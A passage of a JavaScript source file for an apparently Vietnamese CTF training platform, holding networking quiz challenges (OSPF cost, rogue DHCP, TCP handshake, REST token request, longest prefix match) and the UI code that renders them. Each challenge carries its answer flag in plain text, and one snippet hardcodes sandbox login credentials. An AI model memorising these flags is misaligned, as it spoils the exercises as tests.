(Ví dụ: FLAG{tcp_port_80_https})`,
                virtualFiles: {
                    "running_config.ios": `access-list 105 permit tcp any host 10.20.30.40 eq 443\naccess-list 105 permit udp any host 10.20.30.40 eq 53`
                },
                defense: `1. Áp dụng nguyên tắc Least Privilege trong thiết kế ACL: chỉ mở cổng dịch vụ cần thiết tới đúng địa chỉ IP máy chủ.
2. Kiểm tra log từ chối của ACL để phát hiện sớm các đợt rà quét cổng:
access-list 105 deny ip any any log`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Cisco IOS CLI, tra cứu số hiệu cổng dịch vụ HTTPS.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Dòng permit tcp cho phép cổng sau toán tử <code>eq</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{tcp_port_443_https}"
            },
            {
                id: 19,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 19: OSPF Metric Shortest Path (Tối Ưu Tuyến Đường OSPF)",
                category: "Định Tuyến Động",
                difficulty: "Trung bình",
                points: 200,
                mitre: { tactic: "Discovery", technique: "T1016", name: "System Network Configuration Discovery" },
                description: "Một gói tin dữ liệu cần đi từ Router A đến Router D qua mạng OSPF. Công thức Cost = 100 Mbps / Bandwidth. Tuyến A -> B -> D có băng thông A-B là 100 Mbps (Cost 1) và B-D là 10 Mbps (Cost 10). Tuyến A -> C -> D có băng thông A-C là 1 Gbps (Cost 1) và C-D là 1 Gbps (Cost 1). Tổng Cost của tuyến đường tối ưu được OSPF lựa chọn là bao nhiêu?",
                theory: "OSPF (Open Shortest Path First) là giao thức định tuyến trạng thái liên kết (Link-State Routing Protocol) sử dụng thuật toán Dijkstra SPF để tính toán đường đi ngắn nhất. Metric của OSPF là Cost tỷ lệ nghịch với băng thông của liên kết.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "ospf-topology",
                    path1: "A -> B -> D (Cost 11)",
                    path2: "A -> C -> D (Cost 2)"
                },
                codeSnippet: `Băng thông tham chiếu chuẩn OSPF: Reference Bandwidth = 100 Mbps.
Công thức tính chi phí đường truyền OSPF: Cost = 100 Mbps / Bandwidth.
(Lưu ý: Nếu Bandwidth >= 100 Mbps, Cost tối thiểu là 1).

Gói tin cần đi từ Router A đến Router D:
- Tuyến 1 (A -> B -> D):
  + Đoạn A-B: Băng thông 100 Mbps
  + Đoạn B-D: Băng thông 10 Mbps (Cost = 100 / 10 = 10)
- Tuyến 2 (A -> C -> D):
  + Đoạn A-C: Băng thông 1 Gbps (Cost = 1)
  + Đoạn C-D: Băng thông 1 Gbps (Cost = 1)

---
YÊU CẦU:
Tính tổng chi phí Metric của tuyến đường ngắn nhất mà OSPF lựa chọn và nhập theo định dạng:
Cú pháp cờ: FLAG{cost_<tổng_cost>_path_<tên_tuyến>}
(Ví dụ: nếu tuyến ABD có cost 11 thì nộp: FLAG{cost_11_path_abd})`,
                virtualFiles: {
                    "ospf_database.txt": `Path ABD: 1 + 10 = 11\nPath ACD: 1 + 1 = 2`
                },
                defense: `1. Điều chỉnh Reference Bandwidth phù hợp với hạ tầng mạng tốc độ cao (10 Gbps / 40 Gbps) để OSPF phân biệt chính xác chi phí:
auto-cost reference-bandwidth 10000
2. Thiết lập xác thực OSPF HMAC-SHA256 giữa các Router lân cận để chống giả mạo LSA.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Thuật toán Dijkstra, Cisco CLI <code>show ip ospf route</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - OSPF luôn chọn tuyến có tổng Cost thấp nhất.<br>
            - Tuyến ACD có cost 1 + 1 = 2.
        </div>
    </div>
</div>`,
                flag: "FLAG{cost_2_path_acd}"
            },
            {
                id: 20,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 20: Rogue DHCP Server Hunt (Truy Lùng Máy Chủ DHCP Giả Mạo)",
                category: "Phân Tích Tấn Công",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Adversary-in-the-Middle", technique: "T1584.001", name: "Compromise Infrastructure: DHCP Server" },
                description: "Người dùng trong văn phòng phàn nàn bị cấp sai Default Gateway. Bật tính năng DHCP Snooping trên Switch phát hiện bảng log sau. Hãy tìm ra địa chỉ MAC của thiết bị giả mạo gắn vào cổng Untrusted!",
                theory: "Giao thức DHCP phát tán gói tin Discover/Offer ở dạng broadcast. Một máy chủ Rogue DHCP kết nối vào cổng switch có thể trả lời gói Offer nhanh hơn máy chủ chính quy, cấp sai Default Gateway trỏ về chính máy của kẻ tấn công để nghe lén toàn bộ lưu lượng của nạn nhân.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "dhcp-snooping-table",
                    untrustedPort: "FastEthernet0/24"
                },
                codeSnippet: `Switch# show ip dhcp snooping binding
MacAddress          IpAddress        Lease(sec)  Type            VLAN  Interface
------------------  ---------------  ----------  --------------  ----  -----------------
00:1A:2B:3C:4D:5E   192.168.1.100    86400       dhcp-snooping   10    GigabitEthernet0/1 [TRUSTED]
F4:0F:24:99:AA:BB   192.168.1.254    86400       dhcp-snooping   10    FastEthernet0/24   [UNTRUSTED_ALERT]
00:14:22:AA:BB:CC   192.168.1.105    86400       dhcp-snooping   10    GigabitEthernet0/2 [TRUSTED]

---
YÊU CẦU:
Tìm địa chỉ MAC của thiết bị giả mạo máy chủ DHCP gắn vào cổng không tin cậy (Untrusted).
Cú pháp cờ: FLAG{<MAC_ADDRESS>}
(Ví dụ: FLAG{00:11:22:33:44:55})`,
                virtualFiles: {
                    "dhcp_bindings.txt": `F4:0F:24:99:AA:BB on Fa0/24 UNTRUSTED`
                },
                defense: `1. Cấu hình cổng nối tới DHCP Server hợp lệ là TRUSTED, toàn bộ các cổng còn lại mặc định là UNTRUSTED:
interface GigabitEthernet0/1
 ip dhcp snooping trust
2. Switch sẽ tự động Drop toàn bộ gói tin DHCP Offer phát sinh từ các cổng Untrusted.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>show ip dhcp snooping binding</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Tìm dòng chứa nhãn UNTRUSTED_ALERT.
        </div>
    </div>
</div>`,
                flag: "FLAG{F4:0F:24:99:AA:BB}"
            },
            {
                id: 21,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 21: TCP 3-Way Handshake Cracking (Bắt Tay 3 Bước TCP)",
                category: "Giao Thức Lớp 4",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Initial Access", technique: "T1210", name: "Exploitation of Remote Services" },
                description: "Máy Client gửi gói tin SYN khởi tạo kết nối TCP đến Server với Initial Sequence Number (ISN) = 1000. Để hoàn thành bước thứ 2 trong quá trình bắt tay, Server phải phản hồi gói tin SYN-ACK với giá trị Acknowledgment Number (AckN) bằng bao nhiêu?",
                theory: "Quá trình bắt tay 3 bước TCP đảm bảo đồng bộ hóa số thứ tự (Sequence Numbers) giữa hai đầu kết nối: 1) Client gửi [SYN, Seq=X]; 2) Server gửi [SYN-ACK, Seq=Y, Ack=X+1]; 3) Client gửi [ACK, Seq=X+1, Ack=Y+1]. Do cờ SYN và cờ FIN tiêu thụ 1 đơn vị sequence ảo, AckNumber luôn tăng lên 1 đơn vị.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "tcp-handshake",
                    step1: "Client -> Server: SYN (Seq=1000)",
                    step2: "Server -> Client: SYN-ACK (Seq=5000, Ack=?)"
                },
                codeSnippet: `Quá trình bắt tay 3 bước TCP giữa Client và Server:
Bước 1: Client -> Server: [SYN] Seq = 1000
Bước 2: Server -> Client: [SYN, ACK] Seq = 5000, Ack = ???

---
YÊU CẦU:
Theo chuẩn RFC 793, cờ SYN tiêu thụ 1 đơn vị Sequence Number ảo.
Tính giá trị trường Acknowledgment Number (Ack) mà Server phải gửi trong gói SYN-ACK.
Cú pháp cờ: FLAG{ack_<giá_trị>}
(Ví dụ: FLAG{ack_5001})`,
                virtualFiles: {
                    "rfc793_snippet.txt": `Acknowledgement Number: The next sequence number that the sender of the segment is expecting to receive.`
                },
                defense: `1. Sử dụng thuật toán Random ISN (RFC 1948) chống tấn công TCP Sequence Prediction Attack.
2. Kiểm tra tính hợp lệ của cờ TCP bằng firewall Stateful loại bỏ các gói tin bất thường như Xmas scan (FIN, PSH, URG).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • RFC 793 TCP Specification.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Ack = Seq_Client + 1 = 1000 + 1 = 1001.
        </div>
    </div>
</div>`,
                flag: "FLAG{ack_1001}"
            },
            {
                id: 22,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 22: REST API Token Extraction (Tự Động Hóa Mạng)",
                category: "Lập Trình Mạng",
                difficulty: "Nâng cao",
                points: 250,
                mitre: { tactic: "Execution", technique: "T1059", name: "Command and Scripting Interpreter" },
                description: "Bạn đang viết kịch bản Python tương tác với controller Cisco DNA Center để yêu cầu cấp mã xác thực Bearer Token. Phương thức HTTP Verb chuẩn nào được sử dụng khi gửi thông tin xác thực đăng nhập trong Request Body đến URI /dna/system/api/v1/auth/token?",
                theory: "Kiến trúc RESTful API sử dụng các phương thức HTTP chuẩn: GET (đọc dữ liệu), POST (tạo mới tài nguyên hoặc phiên xác thực), PUT (cập nhật toàn bộ), PATCH (cập nhật từng phần), DELETE (xóa). Để gửi thông tin đăng nhập và yêu cầu cấp mới token phiên làm việc, POST là phương thức bắt buộc.",
                sandboxType: "web",
                sandboxData: {
                    type: "rest-api",
                    endpoint: "/dna/system/api/v1/auth/token"
                },
                codeSnippet: `import requests

url = "https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token"
headers = {"Content-Type": "application/json"}

# Lập trình viên đang gọi API để xác thực và yêu cầu cấp mới Bearer Token:
response = requests.request("???", url, auth=("devnetuser", "Cisco123!"))

---
YÊU CẦU:
Trong chuẩn kiến trúc RESTful API, phương thức HTTP Verb nào (chữ thường: get, post, put, hay delete) được dùng khi gửi thông tin đăng nhập để yêu cầu tạo mới token phiên làm việc?
Cú pháp cờ: FLAG{http_<method>_token}
(Ví dụ: FLAG{http_get_token})`,
                virtualFiles: {
                    "dnac_auth.py": `import requests\nresp = requests.post("https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token")`
                },
                defense: `1. Luôn sử dụng giao thức HTTPS (TLS 1.3) để mã hóa toàn bộ dữ liệu trao đổi API.
2. Thiết lập thời gian sống ngắn cho Bearer Token (ví dụ: 1 giờ) và sử dụng Refresh Token được lưu trữ an toàn.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Postman, Python requests.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Tạo mới phiên / token luôn dùng phương thức <code>POST</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{http_post_token}"
            },
            {
                id: 23,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 23: Master Flag: Longest Prefix Match Triage (Giải Mã Định Tuyến)",
                category: "Định Tuyến Cốt Lõi",
                difficulty: "Chuyên gia",
                points: 300,
                mitre: { tactic: "Discovery", technique: "T1016", name: "System Network Configuration Discovery" },
                description: "Router nhận được gói tin có địa chỉ IP đích là 10.10.20.150. Trong bảng định tuyến có 4 tuyến đường thỏa mãn: 10.0.0.0/8 (Next-Hop A), 10.10.0.0/16 (Next-Hop B), 10.10.20.0/24 (Next-Hop C) và 10.10.20.128/26 (Next-Hop D). Theo luật Longest Prefix Match của Cisco, gói tin sẽ được chuyển tiếp qua Next-Hop nào?",
                theory: "Nguyên lý Longest Prefix Match (LPM) quy định rằng khi một gói tin IP khớp với nhiều tuyến đường khác nhau trong bảng định tuyến, Router sẽ luôn ưu tiên chọn tuyến đường có độ dài mặt nạ mạng con (Subnet Mask Prefix) dài nhất (nghĩa là tuyến đường mô tả dải mạng cụ thể nhất, có số bit 1 lớn nhất).",
                sandboxType: "forensics",
                sandboxData: {
                    type: "lpm-lookup",
                    dstIp: "10.10.20.150",
                    routes: [
                        { prefix: "10.0.0.0/8", nextHop: "A" },
                        { prefix: "10.10.0.0/16", nextHop: "B" },
                        { prefix: "10.10.20.0/24", nextHop: "C" },
                        { prefix: "10.10.20.128/26", nextHop: "D (WINNER: /26 is longest)" }
                    ]
                },
                codeSnippet: `Bảng định tuyến của Router:
S    10.0.0.0/8       [1/0]   via Next-Hop A
O    10.10.0.0/16     [110/2] via Next-Hop B
O    10.10.20.0/24    [110/5] via Next-Hop C
S    10.10.20.128/26  [1/0]   via Next-Hop D

Gói tin IP có địa chỉ đích: 10.10.20.150

---
YÊU CẦU:
Theo nguyên lý Longest Prefix Match (LPM), Router sẽ chuyển tiếp gói tin qua Next-Hop nào (chữ cái A, B, C hoặc D) và độ dài prefix dài nhất tương ứng là bao nhiêu bit?
Cú pháp cờ: FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}
(Ví dụ: FLAG{next_hop_a_prefix_8})`,
                virtualFiles: {
                    "routing_table.txt": `10.0.0.0/8 via A\n10.10.0.0/16 via B\n10.10.20.0/24 via C\n10.10.20.128/26 via D`
                },
                defense: `1. Sử dụng tính năng phân chia bảng định tuyến VRF (Virtual Routing and Forwarding) để cô lập các luồng dữ liệu độc lập.
2. Thiết lập định tuyến an toàn với BGP RPKI và lọc tiền tố (Prefix Filtering) để chống BGP Route Hijacking.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>show ip route</code>, lý thuyết LPM.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - 10.10.20.150 thuộc dải /26 (128..191). Prefix dài nhất là 26 bits via Next-Hop D.
        </div>
    </div>
</div>`,
                flag: "FLAG{next_hop_d_prefix_26}"
            }
        ];

        this.initDOM();
        this.bindEvents();
    }

    initDOM() {
        this.ui = {
            totalPointsText: document.getElementById('ctf-total-points'),
            solvedCountBadge: document.getElementById('ctf-solved-count'),
            toggleRoadmapBtn: document.getElementById('ctf-toggle-roadmap-btn'),
            toggleArenaBtn: document.getElementById('ctf-toggle-arena-btn'),
            roadmapView: document.getElementById('ctf-roadmap-view'),
            arenaView: document.getElementById('ctf-arena-view'),
            roadmapLayersContainer: document.getElementById('ctf-roadmap-layers'),
            roadmapProgressBadge: document.getElementById('ctf-roadmap-progress-badge'),
            challengeNav: document.getElementById('ctf-challenge-nav'),
            domainFilters: document.getElementById('ctf-domain-filters'),
            filterCountBadge: document.getElementById('ctf-filter-count-badge'),
            cardTitle: document.getElementById('ctf-card-title'),
            cardDomain: document.getElementById('ctf-card-domain'),
            cardCategory: document.getElementById('ctf-card-category'),
            cardDifficulty: document.getElementById('ctf-card-difficulty'),
            cardPoints: document.getElementById('ctf-card-points'),
            cardDesc: document.getElementById('ctf-card-desc'),
            mitreBadge: document.getElementById('ctf-mitre-badge'),
            cardTheoryContent: document.getElementById('ctf-card-theory-content'),
            sandboxBadge: document.getElementById('ctf-sandbox-badge'),
            sandboxContainer: document.getElementById('ctf-sandbox-container'),
            codeSnippet: document.getElementById('ctf-card-code'),
            cardDefenseContent: document.getElementById('ctf-card-defense-content'),
            hintToggleBtn: document.getElementById('ctf-hint-toggle-btn'),
            hintBox: document.getElementById('ctf-hint-box'),
            hintText: document.getElementById('ctf-hint-text'),
            flagInput: document.getElementById('ctf-flag-input'),
            submitBtn: document.getElementById('ctf-submit-btn'),
            statusBox: document.getElementById('ctf-status-box'),
            terminalInput: document.getElementById('ctf-terminal-input'),
            terminalOutput: document.getElementById('ctf-terminal-output'),
            workbenchTabs: document.querySelectorAll('.ctf-workbench-tab')
        };
    }

    bindEvents() {
        // Toggle between Roadmap and Arena
        if (this.ui.toggleRoadmapBtn) {
            this.ui.toggleRoadmapBtn.addEventListener('click', () => {
                this.switchView('roadmap');
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        if (this.ui.toggleArenaBtn) {
            this.ui.toggleArenaBtn.addEventListener('click', () => {
                this.switchView('arena');
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Workbench tabs click
        if (this.ui.workbenchTabs) {
            this.ui.workbenchTabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    const targetTab = tab.getAttribute('data-tab');
                    this.switchWorkbenchTab(targetTab);
                    if (window.soundManager) window.soundManager.playClick();
                });
            });
        }

        // Submit Flag
        if (this.ui.submitBtn) {
            this.ui.submitBtn.addEventListener('click', () => {
                this.handleSubmitFlag();
            });
        }

        if (this.ui.flagInput) {
            this.ui.flagInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    this.handleSubmitFlag();
                }
            });
        }

        // Hint toggle
        if (this.ui.hintToggleBtn) {
            this.ui.hintToggleBtn.addEventListener('click', () => {
                this.ui.hintBox.classList.toggle('hidden');
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Domain filters
        if (this.ui.domainFilters) {
            this.ui.domainFilters.addEventListener('click', (e) => {
                const btn = e.target.closest('.ctf-filter-btn');
                if (!btn) return;
                const domain = btn.getAttribute('data-domain');
                this.filterByDomain(domain);
                if (window.soundManager) window.soundManager.playClick();
            });
        }

        // Terminal CLI input
        if (this.ui.terminalInput) {
            this.ui.terminalInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const cmd = this.ui.terminalInput.value.trim();
                    this.ui.terminalInput.value = '';
                    this.handleTerminalCommand(cmd);
                }
            });
        }

        // Render initial components
        this.renderRoadmap();
        this.renderChallengeList();
        this.renderActiveChallenge();
        this.updateStats();
    }

    switchView(viewName) {
        this.activeView = viewName;
        if (viewName === 'roadmap') {
            this.ui.roadmapView.classList.remove('hidden');
            this.ui.arenaView.classList.add('hidden');
            this.ui.toggleRoadmapBtn.classList.add('active');
            this.ui.toggleArenaBtn.classList.remove('active');
            this.renderRoadmap();
        } else {
            this.ui.roadmapView.classList.add('hidden');
            this.ui.arenaView.classList.remove('hidden');
            this.ui.toggleRoadmapBtn.classList.remove('active');
            this.ui.toggleArenaBtn.classList.add('active');
            this.renderChallengeList();
            this.renderActiveChallenge();
        }
    }

    switchWorkbenchTab(tabName) {
        this.activeWorkbenchTab = tabName;

        // Update tab buttons
        if (this.ui.workbenchTabs) {
            this.ui.workbenchTabs.forEach(t => {
                if (t.getAttribute('data-tab') === tabName) {
                    t.classList.add('active');
                } else {
                    t.classList.remove('active');
                }
            });
        }

        // Hide all panels
        const panelTheory = document.getElementById('ctf-panel-theory');
        const panelSandbox = document.getElementById('ctf-panel-sandbox');
        const panelTerminal = document.getElementById('ctf-panel-terminal');
        const panelDefense = document.getElementById('ctf-panel-defense');

        if (panelTheory) panelTheory.classList.add('hidden');
        if (panelSandbox) panelSandbox.classList.add('hidden');
        if (panelTerminal) panelTerminal.classList.add('hidden');
        if (panelDefense) panelDefense.classList.add('hidden');

        // Show active panel
        const activePanel = document.getElementById(`ctf-panel-${tabName}`);
        if (activePanel) activePanel.classList.remove('hidden');
    }

    renderRoadmap() {
        if (!this.ui.roadmapLayersContainer) return;
        this.ui.roadmapLayersContainer.innerHTML = '';

        this.roadmapLayers.forEach(layer => {
            const card = document.createElement('div');
            card.className = "ctf-roadmap-card space-y-3";

            // Count solved in this layer
            let solvedInLayer = 0;
            layer.labIds.forEach(id => {
                if (this.solvedFlags.has(id)) solvedInLayer++;
            });
            const percent = Math.round((solvedInLayer / layer.labIds.length) * 100);

            card.innerHTML = `
                <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
                    <div class="flex items-center gap-2">
                        <span class="text-xl">${layer.icon}</span>
                        <div>
                            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800 font-bold">${layer.layerNum}</span>
                            <h4 class="text-sm sm:text-base font-black text-slate-100 inline ml-2">${layer.title}</h4>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <span class="text-xs font-mono font-bold ${solvedInLayer === layer.labIds.length ? 'text-emerald-400' : 'text-slate-400'}">
                            ${solvedInLayer} / ${layer.labIds.length} Hoàn Thành (${percent}%)
                        </span>
                        <button class="ctf-start-layer-btn px-3 py-1.5 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-bold transition flex items-center gap-1 shadow-lg shadow-cyan-900/30" data-domain="${layer.domain}">
                            <span>🚀 Vào Lab Tầng Này</span>
                        </button>
                    </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-12 gap-3 text-xs leading-relaxed">
                    <div class="md:col-span-4 p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80 space-y-1">
                        <div class="font-bold text-amber-400 flex items-center gap-1">
                            <span>⚠️</span> Điểm Yếu & Nguy Cơ Đặc Trưng:
                        </div>
                        <p class="text-slate-300 text-[11px]">${layer.weaknesses}</p>
                    </div>

                    <div class="md:col-span-4 p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80 space-y-1">
                        <div class="font-bold text-rose-400 flex items-center gap-1">
                            <span>⚔️</span> Kỹ Thuật Tấn Công & MITRE:
                        </div>
                        <ul class="text-slate-300 text-[11px] space-y-1 list-disc pl-3">
                            ${layer.attacks.map(att => `<li>${att}</li>`).join('')}
                        </ul>
                    </div>

                    <div class="md:col-span-4 p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80 space-y-1">
                        <div class="font-bold text-emerald-400 flex items-center gap-1">
                            <span>🛡️</span> Phòng Ngự Chiều Sâu (Hardening):
                        </div>
                        <p class="text-slate-300 text-[11px]">${layer.defense}</p>
                    </div>
                </div>

                <div class="flex flex-wrap items-center justify-between gap-2 pt-1 border-t border-slate-800/60 text-[11px] text-slate-400">
                    <div class="flex items-center gap-1.5 flex-wrap">
                        <span class="font-semibold text-slate-400">Các bài Lab:</span>
                        ${layer.labIds.map(id => {
                            const isDone = this.solvedFlags.has(id);
                            return `<span class="px-2 py-0.5 rounded font-mono ${isDone ? 'bg-emerald-950 text-emerald-300 border border-emerald-800' : 'bg-slate-800 text-slate-300'}">Lab ${id} ${isDone ? '✅' : '🚩'}</span>`;
                        }).join(' ')}
                    </div>
                    <span class="font-mono text-cyan-400 font-semibold">${layer.mitre}</span>
                </div>
            `;

            const startBtn = card.querySelector('.ctf-start-layer-btn');
            if (startBtn) {
                startBtn.addEventListener('click', () => {
                    this.filterByDomain(layer.domain);
                    this.switchView('arena');
                    if (window.soundManager) window.soundManager.playClick();
                });
            }

            this.ui.roadmapLayersContainer.appendChild(card);
        });

        // Update overall roadmap progress badge
        const totalSolved = this.solvedFlags.size;
        const totalLabs = this.challenges.length;
        const totalPercent = Math.round((totalSolved / totalLabs) * 100);
        if (this.ui.roadmapProgressBadge) {
            this.ui.roadmapProgressBadge.textContent = `${totalSolved}/${totalLabs} (${totalPercent}%)`;
        }
    }

    filterByDomain(domain) {
        this.currentDomainFilter = domain;

        if (this.ui.domainFilters) {
            const btns = this.ui.domainFilters.querySelectorAll('.ctf-filter-btn');
            btns.forEach(b => {
                if (b.getAttribute('data-domain') === domain) {
                    b.classList.add('active');
                } else {
                    b.classList.remove('active');
                }
            });
        }

        const filtered = this.getFilteredChallenges();
        if (filtered.length > 0) {
            const current = this.challenges[this.activeChallengeIndex];
            if (this.currentDomainFilter !== 'all' && current && current.domain !== this.currentDomainFilter) {
                const firstMatchingIdx = this.challenges.findIndex(c => c.domain === this.currentDomainFilter);
                if (firstMatchingIdx !== -1) {
                    this.activeChallengeIndex = firstMatchingIdx;
                }
            }
        }

        this.renderChallengeList();
        this.renderActiveChallenge();
    }

    getFilteredChallenges() {
        if (this.currentDomainFilter === 'all') {
            return this.challenges;
        }
        return this.challenges.filter(c => c.domain === this.currentDomainFilter);
    }

    updateStats() {
        let total = 0;
        this.challenges.forEach(c => {
            if (this.solvedFlags.has(c.id)) {
                total += c.points;
            }
        });

        if (this.ui.totalPointsText) this.ui.totalPointsText.textContent = `${total} PTS`;
        if (this.ui.solvedCountBadge) this.ui.solvedCountBadge.textContent = `${this.solvedFlags.size} / ${this.challenges.length} Cờ Đã Giải`;
        if (this.ui.filterCountBadge) {
            const count = this.getFilteredChallenges().length;
            this.ui.filterCountBadge.textContent = `${count} bài`;
        }
    }

    renderChallengeList() {
        if (!this.ui.challengeNav) return;
        this.ui.challengeNav.innerHTML = '';

        const filtered = this.getFilteredChallenges();
        if (filtered.length === 0) {
            this.ui.challengeNav.innerHTML = '<div class="text-xs text-slate-500 p-4 text-center">Không có thử thách nào phù hợp.</div>';
            return;
        }

        filtered.forEach((c) => {
            const idx = this.challenges.findIndex(item => item.id === c.id);
            const btn = document.createElement('button');
            const isSolved = this.solvedFlags.has(c.id);
            const isActive = idx === this.activeChallengeIndex;

            btn.className = `ctf-nav-btn ${isActive ? 'active' : ''} ${isSolved ? 'solved' : ''}`;
            btn.innerHTML = `
                <div class="flex items-center justify-between">
                    <span class="font-bold text-xs truncate max-w-[210px]">${isSolved ? '✅' : '🚩'} Bài ${c.id}: ${c.category}</span>
                    <span class="text-xs text-cyan-400 font-mono font-bold shrink-0">+${c.points}p</span>
                </div>
                <div class="text-[11px] text-slate-400 truncate text-left mt-0.5">${c.title.split(':')[1] || c.title}</div>
                <div class="flex items-center gap-1.5 mt-1">
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-purple-950/80 text-purple-300 border border-purple-800/60">${c.domainVi.split('(')[0].trim()}</span>
                    <span class="text-[10px] px-1.5 py-0.2 rounded bg-slate-800 text-slate-300">${c.difficulty}</span>
                </div>
            `;

            btn.addEventListener('click', () => {
                this.activeChallengeIndex = idx;
                if (window.soundManager) window.soundManager.playClick();
                this.renderChallengeList();
                this.renderActiveChallenge();
            });

            this.ui.challengeNav.appendChild(btn);
        });

        this.updateStats();
    }

    renderActiveChallenge() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c) return;

        const isSolved = this.solvedFlags.has(c.id);

        if (this.ui.cardTitle) this.ui.cardTitle.textContent = c.title;
        if (this.ui.cardDomain) this.ui.cardDomain.textContent = c.domainVi;
        if (this.ui.cardCategory) this.ui.cardCategory.textContent = c.category;
        if (this.ui.cardDifficulty) this.ui.cardDifficulty.textContent = c.difficulty;
        if (this.ui.cardPoints) this.ui.cardPoints.textContent = `+${c.points} Điểm`;
        if (this.ui.cardDesc) this.ui.cardDesc.textContent = c.description;

        // MITRE ATT&CK Badge
        if (this.ui.mitreBadge && c.mitre) {
            this.ui.mitreBadge.textContent = `MITRE ATT&CK: ${c.mitre.technique} (${c.mitre.name})`;
        }

        // Panel 1: Theory
        if (this.ui.cardTheoryContent) {
            this.ui.cardTheoryContent.textContent = c.theory || "Nội dung lý thuyết đang được cập nhật.";
        }

